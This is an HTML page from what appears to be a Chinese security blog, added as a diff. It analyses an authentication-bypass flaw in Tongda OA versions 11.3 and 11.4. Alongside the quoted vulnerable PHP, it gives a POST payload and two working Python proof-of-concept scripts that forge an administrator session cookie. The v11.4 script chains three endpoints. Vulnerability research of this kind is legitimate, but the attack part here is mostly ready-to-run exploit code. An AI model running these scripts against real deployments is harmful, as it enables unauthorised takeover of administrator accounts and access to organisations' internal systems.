@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="Q1ngShan">
+    
+    <title>
+        
+            通达OA前台任意用户登录漏洞分析 |
+        
+        Q1ngShan&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.svg">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/css/font-awesome.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":false},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.svg","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":false},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":true},"lazyload":{"enable":false},"version":"3.4.5"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fas fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                Q1ngShan&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                CATEGORIES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                TAGS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">CATEGORIES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">TAGS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">通达OA前台任意用户登录漏洞分析</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/avatar.svg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">Q1ngShan</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2020-04-24 20:38:39</span>
+        <span class="mobile">2020-04-24 20:38</span>
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/PHP/">PHP</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>  通达OA又爆出前台任意用户登录漏洞，此CMS的漏洞还是挺多的，此次的漏洞有很多版本差异。</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="v11-3"><a href="#v11-3" class="headerlink" title="v11.3"></a>v11.3</h3><p>在v11.3中漏洞文件位置在<code>logincheck_code.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;inc/session.php&quot;</span>;</span><br><span class="line">session_start();</span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;inc/conn.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;inc/td_core.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;inc/utility.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;inc/utility_cache.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;inc/TRedis/TRedis.php&quot;</span>;</span><br><span class="line"><span class="variable">$redis</span> = TRedis::redis();</span><br><span class="line"><span class="variable">$UID</span> = intval(<span class="variable">$_POST</span>[<span class="string">&quot;UID&quot;</span>]);</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$PARA_ARRAY</span> = get_sys_para(<span class="string">&quot;SEC_PASS_FLAG,SEC_PASS_TIME,SEC_RETRY_BAN,SEC_RETRY_TIMES,SEC_BAN_TIME,SEC_USER_MEM,SEC_KEY_USER,LOGIN_KEY,SEC_ON_STATUS,SEC_INIT_PASS,LOGIN_SECURE_KEY,LOGIN_USE_DOMAIN,DOMAIN_SYNC_CONFIG,ONE_USER_MUL_LOGIN,IS_CPDA_BYIP,USE_DISCUZ,OA_URL,WEBROOT,DEFAULT_ATTACH_PATH,MOBILE_PC_OPTION,TD_UNIQID&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">list</span>(<span class="variable">$PARA_NAME</span>, <span class="variable">$PARA_VALUE</span>) = each(<span class="variable">$PARA_ARRAY</span>)) &#123;</span><br><span class="line">	<span class="variable">$PARA_NAME</span> = <span class="variable">$PARA_VALUE</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * from USER where UID=&#x27;<span class="subst">$UID</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$cursor</span> = exequery(TD::conn(), <span class="variable">$query</span>);</span><br><span class="line">..........</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$ROW</span> = mysql_fetch_array(<span class="variable">$cursor</span>)) &#123;</span><br><span class="line">	<span class="variable">$SECURE_KEY_SN</span> = <span class="variable">$ROW</span>[<span class="string">&quot;SECURE_KEY_SN&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;LOGIN_USER_NAME&quot;</span>] = <span class="variable">$LOGIN_USER_NAME</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;LOGIN_USER_PRIV&quot;</span>] = <span class="variable">$LOGIN_USER_PRIV</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;LOGIN_USER_PRIV_OTHER&quot;</span>] = <span class="variable">$LOGIN_USER_PRIV_OTHER</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;LOGIN_SYS_ADMIN&quot;</span>] = ((<span class="variable">$LOGIN_USER_PRIV</span> == <span class="string">&quot;1&quot;</span>) || find_id(<span class="variable">$LOGIN_USER_PRIV_OTHER</span>, <span class="string">&quot;1&quot;</span>) ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;LOGIN_DEPT_ID&quot;</span>] = <span class="variable">$LOGIN_DEPT_ID</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;LOGIN_DEPT_ID_OTHER&quot;</span>] = <span class="variable">$LOGIN_DEPT_ID_OTHER</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;LOGIN_AVATAR&quot;</span>] = <span class="variable">$LOGIN_AVATAR</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;LOGIN_THEME&quot;</span>] = <span class="variable">$LOGIN_THEME</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;LOGIN_FUNC_STR&quot;</span>] = <span class="variable">$LOGIN_FUNC_STR</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;LOGIN_NOT_VIEW_USER&quot;</span>] = <span class="variable">$LOGIN_NOT_VIEW_USER</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;LOGIN_ANOTHER&quot;</span>] = <span class="variable">$LOGIN_ANOTHER</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;LOGIN_DEPT_ID_JUNIOR&quot;</span>] = <span class="variable">$LOGIN_DEPT_ID_JUNIOR</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;LOGIN_CLIENT&quot;</span>] = <span class="variable">$LOGIN_CLIENT</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;LOGIN_USER_SEX&quot;</span>] = <span class="variable">$LOGIN_USER_SEX</span>;</span><br></pre></td></tr></table></figure>
+<p>在Line <code>12</code>行获取了<code>UID</code>参数，然后竟然直接带入到了20行的sql语句查询，后续没有对权限的验证处理在Line <code>180-196</code>就保存到了<code>SESSION</code>中。<br>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /logincheck_code.php</span><br><span class="line">    UID=1</span><br></pre></td></tr></table></figure>
+<p>即可获取到<code>cookie</code>，替换当前<code>cookie</code>即可登陆</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">headers=&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getV11Session</span>(<span class="params">url</span>):</span></span><br><span class="line">    checkUrl = url+<span class="string">&#x27;/general/login_code.php&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(checkUrl)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        headers[<span class="string">&quot;User-Agent&quot;</span>] = <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)&quot;</span></span><br><span class="line">        getSessUrl = url+<span class="string">&#x27;/logincheck_code.php&#x27;</span></span><br><span class="line">        res = requests.post(</span><br><span class="line">            getSessUrl, data=&#123; <span class="string">&#x27;UID&#x27;</span>: <span class="built_in">int</span>(<span class="number">1</span>)&#125;,headers=headers)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+]Get Available COOKIE:&#x27;</span>+res.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[-]Something Wrong With &#x27;</span>+url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    getV11Session(<span class="string">&quot;http://xxxxx/&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/04/24/tWEwnv4iMmdR3Ux.jpg"></p>
+<p>替换<code>cookie</code>访问<code>/general/index.php</code>即可<br><img src="https://i.loli.net/2020/04/24/5ebGC7sHZJQXL9S.jpg"><br>在v2017 2018.06.xxx版本中同样是可用的</p>
+<h3 id="v11-4"><a href="#v11-4" class="headerlink" title="v11.4"></a>v11.4</h3><p>相比于v11.3，11.4在<code>logincheck_code.php</code>中的<code>Line15-19</code>加入了验证判断</p>
+<p><img src="https://i.loli.net/2020/04/24/P1pqdTRWXkrQx7H.jpg"><br><code>Line14</code>中<code>login_codeuid</code>变量来于<code>TD::get_cache</code>，只要能够绕过此处的验证即可和v11.3中一样利用。<br>要绕过的条件：</p>
+<ol>
+<li>获取<code>CODEUID</code></li>
+<li>设置cache<code>&quot;CODE_LOGIN&quot; . $CODEUID</code></li>
+</ol>
+<p>搜索<code>TD::get_cache</code>发现<code>general/login_code.php</code>进行了此操作</p>
+<p><img src="https://i.loli.net/2020/04/24/siAeJycD6I5PKzt.jpg"></p>
+<p><img src="https://i.loli.net/2020/04/24/MKek4TgINDm6dL8.jpg"></p>
+<p>这里获取到<code>codeuid</code>后直接再post数据到<code>logincheck_code.php</code>即可<br><img src="https://i.loli.net/2020/04/24/hsoOXHTvcZRUk5b.jpg"></p>
+<p><img src="https://i.loli.net/2020/04/24/vFl2A3drORjeDCE.jpg"><br>替换cookie登录即可</p>
+<p>同样在<code>ispirit/login_code_check.php</code>、<code>general/login_code_scan.php</code>、<code>ispirit/login_code.php</code>三个个文件也可以结合利用</p>
+<p><code>ispirit/login_code_check.php</code>:<br><img src="https://i.loli.net/2020/04/24/4UzTb8WgsSaAwVv.jpg"><br><img src="https://i.loli.net/2020/04/24/c4rNRKOnCyPxG8B.jpg"></p>
+<p><code>Line 5-6</code>获取<code>codeuid</code>和<code>login_codeuid</code>这里的cache类型为<code>CODE_LOGIN_PC</code>且type为<code>confirm</code>才可进入到<code>Line 193-209</code>的设置<code>SESSION</code>流程。</p>
+<p><code>general/login_code_scan.php</code>:<br><img src="https://i.loli.net/2020/04/24/MojyiFZPCaNu1ld.jpg"><br>最后缺少的就是<code>codeuid</code>的获取，恰好在<code>ispirit/login_code.php</code>中输出了<code>codeuid</code></p>
+<p><img src="https://i.loli.net/2020/04/24/BRbL6Euxi4nWyrf.jpg"></p>
+<p>梳理下流程：</p>
+<ol>
+<li>进入<code>ispirit/login_code.php</code>获取<code>codeuid</code></li>
+<li>使用获取的<code>codeuid</code>进入<code>general/login_code_scan.php</code>设置type为<code>confirm</code></li>
+<li>使用<code>codeuid</code>进入<code>ispirit/login_code_check.php</code></li>
+</ol>
+<p><img src="https://i.loli.net/2020/04/24/ZRvLPbwVf9oK6Bi.jpg"></p>
+<p>poc:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSession</span>(<span class="params">url</span>):</span></span><br><span class="line">    vulUrl = url+<span class="string">&#x27;/ispirit/login_code.php&#x27;</span></span><br><span class="line">    res = requests.get(vulUrl)</span><br><span class="line">    codeuid = json.loads(res.text)[<span class="string">&#x27;codeuid&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(codeuid)</span><br><span class="line">    confirmUrl = url + <span class="string">&#x27;/general/login_code_scan.php&#x27;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;codeuid&#x27;</span>:codeuid,</span><br><span class="line">        <span class="string">&#x27;uid&#x27;</span>: <span class="built_in">int</span>(<span class="number">1</span>),</span><br><span class="line">        <span class="string">&#x27;source&#x27;</span>: <span class="string">&#x27;pc&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;confirm&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res = requests.post(confirmUrl,data=data)</span><br><span class="line">    status = json.loads(res.text)[<span class="string">&#x27;status&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(status)</span><br><span class="line">    <span class="keyword">if</span> status == <span class="built_in">str</span>(<span class="number">1</span>):</span><br><span class="line">        seesionUrl = url + <span class="string">&#x27;/ispirit/login_code_check.php?codeuid=&#x27;</span>+codeuid</span><br><span class="line">        res = requests.get(seesionUrl)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[*]cookie:&#x27;</span>+res.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[-]failed&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    getSession(<span class="string">&#x27;http://xxxx/&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/04/24/5Y1qgD4JWaXuS8p.jpg"></p>
+
+        </div>
+
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">#代码审计</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/PHP/">#PHP</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2020/10/23/%E7%A6%85%E9%81%93-12-4-2-%E5%90%8E%E5%8F%B0getshell/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">禅道&lt;=12.4.2 后台getshell</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2020/03/21/%E6%B5%AA%E6%BD%AEHCM-Cloud-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">浪潮HCM Cloud 命令执行</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span>
+              -
+            
+            2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">Q1ngShan</a>
+        </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.5</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+            <li class="tools-item rss flex-center">
+                <a class="flex-center"
+                   href="/atom.xml"
+                   target="_blank"
+                >
+                    <i class="fas fa-rss"></i>
+                </a>
+            </li>
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#v11-3"><span class="nav-text">v11.3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#v11-4"><span class="nav-text">v11.4</span></a></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/dark-light-toggle.js"></script>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/code-copy.js"></script>
+
+
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/toc.js"></script>
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
